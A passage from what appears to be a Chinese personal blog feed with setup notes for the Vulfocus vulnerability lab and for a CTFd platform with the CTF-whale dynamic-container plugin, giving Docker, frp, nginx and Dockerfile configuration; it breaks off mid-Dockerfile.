src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735648.webp" alt="eyp3ro-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735649.webp" alt="g75r7d-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735650.webp" alt="gpzve7-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735651.webp" alt="j3g7yy-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735652.webp" alt="k7o551-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735653.webp" alt="k7v9yq-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735654.webp" alt="k7wor1-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735655.webp" alt="l3zmwy-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735656.webp" alt="lmxmxy-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735657.webp" alt="m9md18-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735658.webp" alt="ox83gp-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735659.webp" alt="oxkjgm-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735660.webp" alt="pkkm6p-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735661.webp" alt="pkw6y3-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735662.webp" alt="r2g7rm-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735663.webp" alt="rd3pjw-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735664.webp" alt="rddgwm-tuya"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker安装vulfocus</title>
      <link href="/2023/08/30/docker%E5%AE%89%E8%A3%85vulfocus/"/>
      <url>/2023/08/30/docker%E5%AE%89%E8%A3%85vulfocus/</url>
      
        <content type="html"><![CDATA[<p> 安装了好几次，总是出错，也不知道是哪里的问题，写一篇博客记录一下</p><p>docker安装vulfocus  :joy:</p><p>发行版本 ubuntu-22.04</p><p><strong>【1】拉取vulfocus镜像</strong></p><blockquote><p>sudo docker pull vulfocus&#x2F;vulfocus:latest</p></blockquote><p><strong>【2】运行 Vulfocus</strong></p><blockquote><p>sudo docker run -d -p 8080:8080 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -e VUL_IP&#x3D;your-ip vulfocus&#x2F;vulfocus</p></blockquote><p><img src="https://cdn.staticaly.com/gh/lovescxs/image-store@master/202308191840053.png" alt="image-20230819184019923"></p><p><strong>【3】查看一下Vulfocus环境ID</strong></p><blockquote><p>sudo docker ps -a</p></blockquote><p><img src="https://cdn.staticaly.com/gh/lovescxs/image-store@master/202308191841657.png" alt="image-20230819184107616"></p><p><strong>【3.1】启动Vulfocus环境</strong></p><blockquote><p>sudo docker start 环境ID</p></blockquote><p><img src="https://cdn.staticaly.com/gh/lovescxs/image-store@master/202308191842683.png" alt="image-20230819184238648"></p><p><strong>【3.2】查看是否启动成功</strong></p><blockquote><p>sudo docker ps -a</p></blockquote><p>【4】访问靶场环境</p><blockquote><p><a href="http://youer-ip/#/dashboard">http://youer-ip/#/dashboard</a></p></blockquote><p>果不其然出错了，服了</p><p><img src="https://cdn.staticaly.com/gh/lovescxs/image-store@master/202308191843484.png" alt="image-20230819184320424"></p><p>找到问题了，把端口改成80就行了，奇了怪了🤔🤔🤔🤔🤔</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFD支持动态靶机的搭建笔记</title>
      <link href="/2023/08/30/ctfd%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/08/30/ctfd%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>###ctfd搭建</p><p><a href="https://www.yuque.com/dengfenglai-esbap/kb/mc4k41#pBjVN">基于docker搭建支持动态靶机的靶场 (yuque.com)</a></p><h1 id="CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）"><a href="#CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）" class="headerlink" title="CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）"></a>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</h1><h2 id="本篇文章最后更新于2021-2-25"><a href="#本篇文章最后更新于2021-2-25" class="headerlink" title="本篇文章最后更新于2021.2.25"></a>本篇文章最后更新于2021.2.25</h2><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ctfd可以说是如今最方便的ctf靶场搭建平台，支持各种插件与二次开发，<a href="https://www.zhaoj.in/">赵师傅</a>早前写了一款插件ctf-whale非常方便，但本人在搭建的过程中遇到了不少问题，经过不断研究终于完成，特此记录，以防后期忘记，也供大家交流学习。<br>赵师傅开发的插件是为了适合 <a href="https://buuoj.cn/">buu</a> 的架构,本篇文章采用完整流程+填坑讲解的格式。</p><p>我修改了一份CTFd，已上传github：<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">https://github.com/Err0rCM/CTFd_with_CTFd-whale</a> ，启动后仍需按照教程后半部分配置，省去前半部分时间，如有问题请提issue或者从头自行配置。</p><h4 id="强调！"><a href="#强调！" class="headerlink" title="强调！"></a>强调！</h4><p>由于当时国内git clone实在太慢，因为本人未配好代理，所以采用的方法是科学上网下载zip解压的方式，可自行百度git clong与Download zip的区别。本篇文章是用本地下载zip解压上传的方式完成<strong>在服务器上</strong>搭建</p><p>如果阅读中操作出现问题请自行百度，翻到文末查看坑点讲解或者查看其它搭建文章</p><p>这里感谢赵师傅zhaoj，fjh1997等前辈写的文章指导，读者遇到问题或有不足或缺陷的地方请私信我添加改正</p><h2 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h2><p><strong>注意</strong>：本机为CentOS7<br>要求：</p><ol><li>已安装基础环境，熟悉linux基本操作</li><li>已安装好 Docker 和 Docker-Compose，并且启用 Docker Swarm，完成换源等操作</li><li>会<em>科学上网</em></li><li>有绝对的耐心</li></ol><p>需求：</p><ol><li>下载赵师傅改写的ctfd，赵师傅已经完成了镜像换源等操作</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/glzjin/CTFd.git -&gt;赵师傅仓库</span><br></pre></td></tr></table></figure><ol><li>下载frp</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf frp_0.29.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>也可以直接访问链接下载然后解压上传</p><ol><li>下载ctf-whale</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/glzjin/CTFd-Whale</span><br></pre></td></tr></table></figure><ol><li><p>下载docker的frps</p><p>这里在赵师傅仓库里扒拉发现的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/glzjin/Frp-Docker-For-CTFd-Whale</span><br></pre></td></tr></table></figure></li></ol><p>以上除ctfd解压后请确保字母小写，并只有一级文件夹</p><hr><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-docker集群设置"><a href="#1-docker集群设置" class="headerlink" title="1.docker集群设置"></a>1.docker集群设置</h3><p>输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker swarm init</span><br><span class="line"></span><br><span class="line">docker node ls</span><br><span class="line"></span><br><span class="line">docker node update --label-add name=linux-1 &lt;节点 ID&gt;</span><br></pre></td></tr></table></figure><p><img src="https://err0r.top/article/CTFD/20201017233032375.png" alt="docker集群设置"></p><p>具体原理等可以查看其它ctfd搭建文章，文末会贴出，这里不做过多阐述</p><h3 id="2-放入ctfd-whale"><a href="#2-放入ctfd-whale" class="headerlink" title="2.放入ctfd-whale"></a>2.放入ctfd-whale</h3><p>将解压的ctfd-whale改小写后放入&#x2F;CTFd&#x2F;CTFd&#x2F;plugins</p><h3 id="3-安装frps（这里有其他教程写的是不对的）"><a href="#3-安装frps（这里有其他教程写的是不对的）" class="headerlink" title="3.安装frps（这里有其他教程写的是不对的）"></a>3.安装frps（这里有其他教程写的是不对的）</h3><p>这里注意下，frp<strong>不是</strong>装在服务器机子上的，简单来说，frps与frpc都是在docker里的。（大坑在这里）<br>frpc是在ctfd里的，frps是在docker机里的</p><p>上传赵师傅的Frp-Docker-For-CTFd-Whale，进入目录后运行<code>docker-compose up -d</code>即可，然后<code>docker ps</code>可看到frps的容器运行中</p><p><img src="https://err0r.top/article/CTFD/202010172331132.png" alt="frps"></p><p>这里看到frps有28000-28100，这是在<strong>Frp-Docker-For-CTFd-Whale里的docker-compose.yml</strong>，可更改配置后compose</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">frps:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">glzjin/frp:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./frp:/conf/</span></span><br><span class="line">    <span class="attr">entrypoint:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/usr/local/bin/frps</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/conf/frps.ini</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;28000-28100:28000-28100&quot;</span>     <span class="comment">#可更改开放端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6490:6490&quot;</span>    <span class="comment">#此处必须与frps.ini配置一致</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">default:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">    <span class="attr">default:</span></span><br></pre></td></tr></table></figure><p>再看一下&#x2F;frp&#x2F;frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 6490</span><br><span class="line">token = randomme</span><br></pre></td></tr></table></figure><h3 id="4-配置ctfd"><a href="#4-配置ctfd" class="headerlink" title="4.配置ctfd"></a>4.配置ctfd</h3><p>直接上<strong>ctfd的docker-compose.yml</strong>配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2.2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ctfd-nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./nginx/http.conf:/etc/nginx/nginx.conf</span>   <span class="comment">#这里注意</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="comment">#- &quot;85:80&quot;     #我将这里注释掉了，这里通过nginx转发感觉速度访问速度会变慢，可能因为我的配置问题，多次尝试之后直接开8000端口访问不会对服务造成影响</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">default:</span></span><br><span class="line">        <span class="attr">internal:</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ctfd</span></span><br><span class="line">    <span class="attr">cpus:</span> <span class="string">&#x27;1.00&#x27;</span>  <span class="comment">#可改</span></span><br><span class="line">    <span class="attr">mem_limit:</span> <span class="string">150M</span>     <span class="comment">#可改</span></span><br><span class="line">  <span class="attr">ctfd:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8000:8000&quot;</span>     <span class="comment">#这里原本没开端口，直接打开访问网站速度会加快</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">UPLOAD_FOLDER=/var/uploads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_URL=redis://cache:6379</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WORKERS=1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">LOG_FOLDER=/var/log/CTFd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ACCESS_LOG=-</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ERROR_LOG=-</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REVERSE_PROXY=true</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.data/CTFd/logs:/var/log/CTFd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.data/CTFd/uploads:/var/uploads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.:/opt/CTFd:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span>     <span class="comment">#这里是添加的</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">default:</span></span><br><span class="line">        <span class="attr">internal:</span></span><br><span class="line">        <span class="attr">frp:</span></span><br><span class="line">            <span class="attr">ipv4_address:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">    <span class="attr">cpus:</span> <span class="string">&#x27;1.00&#x27;</span>     <span class="comment">#可改</span></span><br><span class="line">    <span class="attr">mem_limit:</span> <span class="string">450M</span>     <span class="comment">#可改</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mariadb:10.4</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=ctfd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_USER=ctfd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_PASSWORD=ctfd</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.data/mysql:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">internal:</span></span><br><span class="line">    <span class="comment"># This command is required to set important mariadb defaults</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">mysqld</span>, <span class="string">--character-set-server=utf8mb4</span>, <span class="string">--collation-server=utf8mb4_unicode_ci</span>, <span class="string">--wait_timeout=28800</span>, <span class="string">--log-warnings=0</span>]</span><br><span class="line">    <span class="attr">cpus:</span> <span class="string">&#x27;1.00&#x27;</span>     <span class="comment">#可改</span></span><br><span class="line">    <span class="attr">mem_limit:</span> <span class="string">750M</span>     <span class="comment">#可改</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:4</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.data/redis:/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">internal:</span></span><br><span class="line">    <span class="attr">cpus:</span> <span class="string">&#x27;1.00&#x27;</span>     <span class="comment">#可改</span></span><br><span class="line">    <span class="attr">mem_limit:</span> <span class="string">450M</span>     <span class="comment">#可改</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">frpc:</span>    </span><br><span class="line">    <span class="attr">image:</span> <span class="string">glzjin/frp:latest</span>     <span class="comment">#赵师傅tql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./frpc:/conf/</span>     <span class="comment">#这里注意</span></span><br><span class="line">    <span class="attr">entrypoint:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/usr/local/bin/frpc</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/conf/frpc.ini</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">frp:</span></span><br><span class="line">            <span class="attr">ipv4_address:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.3</span>  <span class="comment">#记住此处</span></span><br><span class="line">        <span class="attr">frp-containers:</span></span><br><span class="line">    <span class="attr">cpus:</span> <span class="string">&#x27;1.00&#x27;</span>     <span class="comment">#可改</span></span><br><span class="line">    <span class="attr">mem_limit:</span> <span class="string">250M</span>     <span class="comment">#可改</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">    <span class="attr">internal:</span></span><br><span class="line">        <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">frp:</span></span><br><span class="line">        <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line">    <span class="attr">frp-containers:</span></span><br><span class="line">        <span class="attr">driver:</span> <span class="string">overlay</span></span><br><span class="line">        <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.2</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br></pre></td></tr></table></figure><p>然后<strong>注意！注意！注意！</strong></p><p>在docker-compose.yml同目录下建nginx文件夹，即与第一个#这里注意相应，然后建<code>http.conf</code>文件写入以下内容</p><p><strong>2021年2月25日更新</strong>目前最新版本的CTFd已经有此配置了，不需要再另加了。</p><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">worker_processes 4;</span><br><span class="line">events &#123;</span><br><span class="line">  worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">  # Configuration containing list of application servers</span><br><span class="line">  upstream app_servers &#123;</span><br><span class="line">    server ctfd:8000;</span><br><span class="line">  &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    client_max_body_size 4G;</span><br><span class="line">    # Handle Server Sent Events for Notifications</span><br><span class="line">    location /events &#123;</span><br><span class="line">      proxy_pass http://app_servers;</span><br><span class="line">      proxy_set_header Connection &#x27;&#x27;;</span><br><span class="line">      proxy_http_version 1.1;</span><br><span class="line">      chunked_transfer_encoding off;</span><br><span class="line">      proxy_buffering off;</span><br><span class="line">      proxy_cache off;</span><br><span class="line">      proxy_redirect off;</span><br><span class="line">      proxy_set_header Host $host;</span><br><span class="line">      proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">      proxy_set_header X-Forwarded-Host $server_name;</span><br><span class="line">    &#125;</span><br><span class="line">    # Proxy connections to the application servers</span><br><span class="line">    location / &#123;</span><br><span class="line">      proxy_pass http://app_servers;</span><br><span class="line">      proxy_redirect off;</span><br><span class="line">      proxy_set_header Host $host;</span><br><span class="line">      proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">      proxy_set_header X-Forwarded-Host $server_name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在docker-compose.yml同目录下建frpc文件夹，即与第二个#这里注意相应，然后进入解压的&#x2F;frp_0.29.0_linux_amd64文件夹，或直接上传，将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frpc</span><br><span class="line">frpc.ini</span><br><span class="line">frpc_full.ini</span><br><span class="line">LICENSE</span><br></pre></td></tr></table></figure><p>放入frpc文件夹<br>接着配置frpc.ini，直接上配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">token = randomme</span><br><span class="line">server_addr = 172.1.0.4</span><br><span class="line">server_port = 6490     #此处必须与frpc.ini配置一致</span><br><span class="line">pool_count = 200</span><br><span class="line">tls_enable = true</span><br><span class="line"></span><br><span class="line">admin_addr = 172.1.0.3 #一定要加！！与后面相应</span><br><span class="line">admin_port = 7400</span><br></pre></td></tr></table></figure><p>此处非常重要，之前本人在这里踩了好多次坑。</p><h3 id="5-配置Dockerfile"><a href="#5-配置Dockerfile" class="headerlink" title="5.配置Dockerfile"></a>5.配置Dockerfile</h3><p>还是直接上配置，<strong>Dockerfile</strong>.注意，最新版本的CTFd已经更换了Dockerfile的写法，可以参考一下apt换源</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-alpine  <span class="comment">#如果出现问题可尝试更换python，一般不需要</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apk update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apk add linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev   <span class="comment">#这里注意1</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser -D -u 1001 -s /bin/bash ctfd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/CTFd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /opt/CTFd /var/log/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/   <span class="comment">#这里注意2</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /opt/CTFd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; <span class="keyword">do</span> \</span></span><br><span class="line"><span class="language-bash">      <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$d</span>/requirements.txt&quot;</span> ]; <span class="keyword">then</span> \</span></span><br><span class="line"><span class="language-bash">        pip install -r <span class="variable">$d</span>/requirements.txt -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/ ; \</span></span><br><span class="line"><span class="language-bash">      <span class="keyword">fi</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="keyword">done</span>; <span class="comment">#同样注意2</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x 